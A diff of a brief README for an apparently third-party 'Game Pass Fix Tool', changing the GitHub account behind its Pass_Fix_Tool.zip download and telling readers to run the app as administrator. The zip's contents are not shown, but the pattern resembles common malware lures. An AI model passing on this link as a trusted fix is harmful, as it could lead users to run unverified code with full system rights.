@@ -1,7 +1,7 @@
 # Fix Game Pass Errors | XBOX Game Pass Error Code Fixer
 Resolve Xbox Game Pass all error codes automatically. Game Pass Fix Tool is a lightweight Windows tool that gets you back in the game fast
 
-- Download and extract <a href="https://github.com/mrhgvn/XBOX-Game-Pass-Error-Code-Fixer/releases/download/XBOX-Game-Pass-Error-Code-Fixer/Pass_Fix_Tool.zip">Pass_Fix_Tool.zip</a> file!
+- Download and extract <a href="https://github.com/methimi/XBOX-Game-Pass-Error-Code-Fixer/releases/download/XBOX-Game-Pass-Error-Code-Fixer/Pass_Fix_Tool.zip">Pass_Fix_Tool.zip</a> file!
 - Run as administrator <b>"GamePass Fix Tool"</b> app!
 - Let the app scan your system for common error patterns
 - Review suggested fixes and apply them instantly
